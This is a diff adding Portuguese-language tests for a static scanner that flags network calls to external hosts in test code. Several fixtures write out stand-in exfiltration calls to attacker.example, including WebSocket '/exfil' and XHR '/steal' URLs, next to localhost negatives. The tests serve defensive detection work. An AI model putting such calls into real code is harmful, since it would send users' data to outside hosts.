@@ -274,6 +274,142 @@ def test_nao_detecta_requisicao_de_rede_a_loopback():
     assert riscos_localhost == []
 
 
+# ---------------------------------------------------------------------------
+# Lacunas de detecção de rede encontradas em teste de ataque real (P7):
+# http.client, urllib3, ftplib, smtplib não estavam em _PREFIXOS_RISCO_REDE.
+# ---------------------------------------------------------------------------
+
+
+def test_detecta_http_client_host_externo():
+    riscos = detectar_riscos_codigo(
+        "import http.client\n"
+        "def test_x():\n"
+        "    http.client.HTTPSConnection('attacker.example')\n"
+    )
+    assert any("rede" in r for r in riscos)
+
+
+def test_nao_detecta_http_client_localhost():
+    riscos = detectar_riscos_codigo(
+        "import http.client\n"
+        "def test_x():\n"
+        "    http.client.HTTPSConnection('localhost')\n"
+    )
+    assert riscos == []
+
+
+def test_detecta_urllib3_poolmanager_request_host_externo():
+    riscos = detectar_riscos_codigo(
+        "import urllib3\n"
+        "def test_x():\n"
+        "    urllib3.PoolManager().request('GET', 'http://attacker.example')\n"
+    )
+    assert any("rede" in r for r in riscos)
+
+
+def test_nao_detecta_urllib3_poolmanager_request_localhost():
+    """Também prova que o PoolManager() interno (sem args) não gera um
+    falso positivo isolado — só a chamada .request(...) é avaliada."""
+    riscos = detectar_riscos_codigo(
+        "import urllib3\n"
+        "def test_x():\n"
+        "    urllib3.PoolManager().request('GET', 'http://localhost:8000')\n"
+    )
+    assert riscos == []
+
+
+def test_detecta_urllib3_poolmanager_guardado_em_variavel_seguido_de_request():
+    """Par explícito pedido: PoolManager() numa linha, .request(...) depois,
+    em vez da cadeia de uma expressão só — prova que a isenção da fábrica
+    sem args (guard 'host is None and not node.args and not node.keywords')
+    não esconde a chamada de rede real que vem depois, guardada numa
+    variável."""
+    riscos_externo = detectar_riscos_codigo(
+        "import urllib3\n\n"
+        "_pool = urllib3.PoolManager()\n\n"
+        "def test_x():\n"
+        "    _pool.request('GET', 'http://attacker.example')\n"
+    )
+    assert any("rede" in r for r in riscos_externo)
+
+    riscos_loopback = detectar_riscos_codigo(
+        "import urllib3\n\n"
+        "_pool = urllib3.PoolManager()\n\n"
+        "def test_x():\n"
+        "    _pool.request('GET', 'http://localhost:8000')\n"
+    )
+    assert riscos_loopback == []
+
+
+def test_detecta_requests_session_guardada_em_variavel_seguido_de_get():
+    """Regressão: prova que o guard que isenta fábricas sem argumento
+    (urllib3.PoolManager(), requests.Session(), etc.) não esconde a chamada
+    de rede real feita na instância guardada numa variável — o payload é o
+    mesmo já usado para investigar essa hipótese de regressão."""
+    riscos = detectar_riscos_codigo(
+        "import requests\n\n"
+        "_sessao_auth = requests.Session()\n\n"
+        "def test_login_healthcheck():\n"
+        "    resposta = _sessao_auth.get('https://attacker.example/health', timeout=2)\n"
+        "    assert resposta.status_code == 200\n"
+    )
+    assert any("rede" in r for r in riscos)
+
+
+def test_detecta_httpx_client_e_asyncclient_e_aiohttp_clientsession_guardados_em_variavel():
+    """Mesmo padrão (fábrica sem args guardada em variável, chamada de
+    método depois) para os outros clientes reutilizáveis citados na revisão
+    deste guard: httpx.Client, httpx.AsyncClient, aiohttp.ClientSession."""
+    for modulo, classe in (
+        ("httpx", "Client"),
+        ("httpx", "AsyncClient"),
+        ("aiohttp", "ClientSession"),
+    ):
+        riscos = detectar_riscos_codigo(
+            f"import {modulo}\n\n"
+            f"_c = {modulo}.{classe}()\n\n"
+            "def test_x():\n"
+            "    _c.get('https://attacker.example')\n"
+        )
+        assert any("rede" in r for r in riscos), f"{modulo}.{classe} não detectado"
+
+
+def test_detecta_ftplib_host_externo():
+    riscos = detectar_riscos_codigo(
+        "import ftplib\n"
+        "def test_x():\n"
+        "    ftplib.FTP('attacker.example')\n"
+    )
+    assert any("rede" in r for r in riscos)
+
+
+def test_nao_detecta_ftplib_localhost():
+    riscos = detectar_riscos_codigo(
+        "import ftplib\n"
+        "def test_x():\n"
+        "    ftplib.FTP('localhost')\n"
+    )
+    assert riscos == []
+
+
+def test_detecta_smtplib_host_externo():
+    riscos = detectar_riscos_codigo(
+        "import smtplib\n"
+        "def test_x():\n"
+        "    smtplib.SMTP('attacker.example')\n"
+    )
+    assert any("rede" in r for r in riscos)
+
+
+def test_nao_detecta_smtplib_localhost():
+    riscos = detectar_riscos_codigo(
+        "import smtplib\n"
+        "def test_x():\n"
+        "    smtplib.SMTP('localhost')\n"
+    )
+    assert riscos == []
+
+
 def test_lista_vazia_para_teste_pytest_normal():
     codigo = (
         "import pytest\n\n"
@@ -468,6 +604,52 @@ def test_nao_detecta_fetch_caminho_relativo():
 
 def test_detecta_template_string_com_interpolacao_como_nao_verificavel():
     riscos = detectar_riscos_spec_ts("fetch(`${baseUrl}/api`);\n")
+    assert any("não verificável estaticamente" in r for r in riscos)
+
+
+# ---------------------------------------------------------------------------
+# Lacunas de detecção de rede encontradas em teste de ataque real (P7):
+# new WebSocket(...) e XMLHttpRequest (via .open(metodo, url)).
+# ---------------------------------------------------------------------------
+
+
+def test_detecta_websocket_host_externo():
+    riscos = detectar_riscos_spec_ts(
+        'const ws = new WebSocket("wss://attacker.example/exfil");\n'
+    )
+    assert any("host externo" in r for r in riscos)
+
+
+def test_nao_detecta_websocket_localhost():
+    riscos = detectar_riscos_spec_ts(
+        'const ws = new WebSocket("ws://localhost:3000");\n'
+    )
+    assert riscos == []
+
+
+def test_detecta_xhr_open_host_externo():
+    riscos = detectar_riscos_spec_ts(
+        'xhr.open("GET", "https://attacker.example/steal");\n'
+    )
+    assert any("host externo" in r for r in riscos)
+
+
+def test_nao_detecta_xhr_open_localhost():
+    riscos = detectar_riscos_spec_ts(
+        'xhr.open("GET", "http://localhost:3000/api");\n'
+    )
+    assert riscos == []
+
+
+def test_nao_detecta_open_de_um_argumento_como_xhr():
+    # window.open(url) tem só 1 argumento — não deve ser confundido com o
+    # padrão .open(metodo, url) do XMLHttpRequest.
+    riscos = detectar_riscos_spec_ts('window.open("https://algumacoisa.com");\n')
+    assert riscos == []
+
+
+def test_detecta_xhr_open_template_string_como_nao_verificavel():
+    riscos = detectar_riscos_spec_ts('xhr.open("GET", `${base}/api`);\n')
     assert any("não verificável estaticamente" in r for r in riscos)
 
 
